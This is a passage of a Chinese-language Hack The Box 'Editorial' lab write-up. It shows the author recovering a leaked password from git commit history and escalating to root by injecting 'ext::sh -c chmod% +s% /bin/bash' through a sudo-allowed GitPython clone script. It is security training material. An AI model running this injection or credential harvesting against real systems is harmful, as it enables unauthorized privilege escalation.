class="line">Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;                                                                      </span><br><span class="line">Date:   Sun Apr 30 21:01:11 2023 -0500            </span><br><span class="line">                                                                      </span><br><span class="line">    change: remove debug and update api port                                                                                                </span><br><span class="line">                                                                      </span><br><span class="line">commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae                       </span><br><span class="line">Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;                                                                      </span><br><span class="line">Date:   Sun Apr 30 20:55:08 2023 -0500                                </span><br><span class="line">                                                                      </span><br><span class="line">    change(api): downgrading prod to dev                              </span><br><span class="line">                                                                      </span><br><span class="line">    * To use development environment.</span><br><span class="line"></span><br><span class="line">commit 1e84a036b2f33c59e2390730699a488c65643d28                    </span><br><span class="line">Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;                                                                      </span><br><span class="line">Date:   Sun Apr 30 20:51:10 2023 -0500                                </span><br><span class="line">                                                                      </span><br><span class="line">    feat: create api to editorial info                                </span><br><span class="line">                                                                      </span><br><span class="line">    * It (will) contains internal info about the editorial, this <span class="built_in">enable</span>                              </span><br><span class="line">       faster access to information.               </span><br><span class="line"></span><br><span class="line">commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8</span><br><span class="line">Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;                                                                      </span><br><span class="line">Date:   Sun Apr 30 20:48:43 2023 -0500                                                                                                      </span><br><span class="line">                                   </span><br><span class="line">    feat: create editorial app</span><br></pre></td></tr></table></figure>

<p>然后挨个版本看一下的话你会发现在其中一个版本他单独替换了<code>user/password</code>部分</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae</span><br><span class="line">commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae</span><br><span class="line">Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;</span><br><span class="line">Date:   Sun Apr 30 20:55:08 2023 -0500</span><br><span class="line"></span><br><span class="line">    change(api): downgrading prod to dev</span><br><span class="line">    </span><br><span class="line">    * To use development environment.</span><br><span class="line"></span><br><span class="line">diff --git a/app_api/app.py b/app_api/app.py</span><br><span class="line">index 61b786f..3373b14 100644</span><br><span class="line">--- a/app_api/app.py</span><br><span class="line">+++ b/app_api/app.py</span><br><span class="line">@@ -64,7 +64,7 @@ def index():</span><br><span class="line"> @app.route(api_route + <span class="string">&#x27;/authors/message&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line"> def api_mail_new_authors():</span><br><span class="line">     <span class="built_in">return</span> jsonify(&#123;</span><br><span class="line">-        <span class="string">&#x27;template_mail_message&#x27;</span>: <span class="string">&quot;Welcome to the team! We are thrilled to have you on board and can&#x27;t wait to see the incredible content you&#x27;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#x27;t hesitate to reach out if you have any questions or ideas - we&#x27;re always here to support you.\n\nBest regards, &quot;</span> + api_editorial_name + <span class="string">&quot; Team.&quot;</span></span><br><span class="line">+        <span class="string">&#x27;template_mail_message&#x27;</span>: <span class="string">&quot;Welcome to the team! We are thrilled to have you on board and can&#x27;t wait to see the incredible content you&#x27;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#x27;t hesitate to reach out if you have any questions or ideas - we&#x27;re always here to support you.\n\nBest regards, &quot;</span> + api_editorial_name + <span class="string">&quot; Team.&quot;</span></span><br></pre></td></tr></table></figure>

<p>他原来的账户密码是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: prod</span><br><span class="line">Password: 080217_Producti0n_2023!@</span><br></pre></td></tr></table></figure>

<p>看下是不是真有这个用户（因为这是台ez所以当时我一进来时候就没收集信息）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dev@editorial:~/apps$ grep bash /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">prod:x:1000:1000:Alirio Acosta:/home/prod:/bin/bash</span><br><span class="line">dev:x:1001:1001::/home/dev:/bin/bash</span><br></pre></td></tr></table></figure>

<p>确定有这个用户就直接切用户就行.</p>
<p>看下prod的sudo -l有没有货</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">prod@editorial:~$ sudo -l </span><br><span class="line">[sudo] password <span class="keyword">for</span> prod: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> prod on editorial:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User prod may run the following commands on editorial:</span><br><span class="line">    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *</span><br></pre></td></tr></table></figure>

<p>看下这个脚本是干啥的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py</span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> git <span class="keyword">import</span> Repo</span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;/opt/internal_apps/clone_changes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">url_to_clone = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">r = Repo.init(<span class="string">&#x27;&#x27;</span>, bare=<span class="literal">True</span>)</span><br><span class="line">r.clone_from(url_to_clone, <span class="string">&#x27;new_changes&#x27;</span>, multi_options=[<span class="string">&quot;-c protocol.ext.allow=always&quot;</span>])</span><br></pre></td></tr></table></figure>

<p>主体还是<code>r</code>做了调用，而<code>r</code>是<code>repo</code>，也就是<code>git</code>库可能有问题，所以我直接去搜</p>
<p><img src="/wpimages/2024/Editorial/wp11.jpg" alt="wp11"></p>
<p>这里其实有点坑，我一开始用的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span class="string">&#x27;ext::sh -c chmod +s /bin/bash&#x27;</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/opt/internal_apps/clone_changes/clone_prod_change.py&quot;</span>, line 12, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    r.clone_from(url_to_clone, <span class="string">&#x27;new_changes&#x27;</span>, multi_options=[<span class="string">&quot;-c protocol.ext.allow=always&quot;</span>])</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python3.10/dist-packages/git/repo/base.py&quot;</span>, line 1275, <span class="keyword">in</span> clone_from</span><br><span class="line">    <span class="built_in">return</span> cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python3.10/dist-packages/git/repo/base.py&quot;</span>, line 1194, <span class="keyword">in</span> _clone</span><br><span class="line">    finalize_process(proc, stderr=stderr)</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python3.10/dist-packages/git/util.py&quot;</span>, line 419, <span class="keyword">in</span> finalize_process</span><br><span class="line">    proc.wait(**kwargs)</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python3.10/dist-packages/git/cmd.py&quot;</span>, line 559, <span class="keyword">in</span> <span class="built_in">wait</span></span><br><span class="line">    raise GitCommandError(remove_password_if_present(self.args), status, errstr)</span><br><span class="line">git.exc.GitCommandError: Cmd(<span class="string">&#x27;git&#x27;</span>) failed due to: <span class="built_in">exit</span> code(128)</span><br><span class="line">  cmdline: git <span class="built_in">clone</span> -v -c protocol.ext.allow=always ext::sh -c <span class="built_in">chmod</span> +s /bin/bash new_changes</span><br><span class="line">  stderr: <span class="string">&#x27;Cloning into &#x27;</span>new_changes<span class="string">&#x27;...</span></span><br><span class="line"><span class="string">chmod: missing operand</span></span><br><span class="line"><span class="string">Try &#x27;</span><span class="built_in">chmod</span> --<span class="built_in">help</span><span class="string">&#x27; for more information.</span></span><br><span class="line"><span class="string">fatal: Could not read from remote repository.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Please make sure you have the correct access rights</span></span><br><span class="line"><span class="string">and the repository exists.</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line">prod@editorial:~$ <span class="built_in">ls</span> /bin/bash -l</span><br><span class="line">-rwxr-xr-x 1 root root 1396520 Mar 14 11:31 /bin/bash</span><br></pre></td></tr></table></figure>

<p>我寻思是传参有啥问题了估计，然后试了下 <code>ext::bash -c whoami</code>还是正常执行的。</p>
<p>然后又回头看了下poc，考虑可能是空格或者字符转义的问题，然后和poc里那样，在一个特殊字符前的命令结尾加了一个<code>%</code>.</p>
<p>最终试了几下，这个成了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py  <span class="string">&#x27;ext::sh -c chmod% +s% /bin/bash&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prod@editorial:~$ <span class="built_in">ls</span> -al /bin/bash</span><br><span class="line">-rwsr-sr-x 1 root root 1396520 Mar 14 11:31 /bin/bash</span><br></pre></td></tr></table></figure>

<p>题外话：他那个<code>app_editorial</code>我还寻思是个模版内注入来着..我看里面有这个<code>render_template</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">&#x27;/about&#x27;</span>)        </span><br><span class="line">def about():                             </span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">&#x27;about.html&#x27;</span>, editorial_name=api_editorial_info(<span class="string">&#x27;name&#x27;</span>), editorial_contact=api_editorial_info(<span class="string">&#x27;contact&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>XD</p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2024/06/24/box-Axlle-wp/"
      title="【season-5】 htb Axlle wp"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        【season-5】 htb Axlle wp
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2024/06/09/box-Blurry-wp/"
      title="【season-5】box Blurry 一个失败的user记录"
     >

    <p class="title-text">
      
        【season-5】box Blurry 一个失败的user记录
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>





    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Flower<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
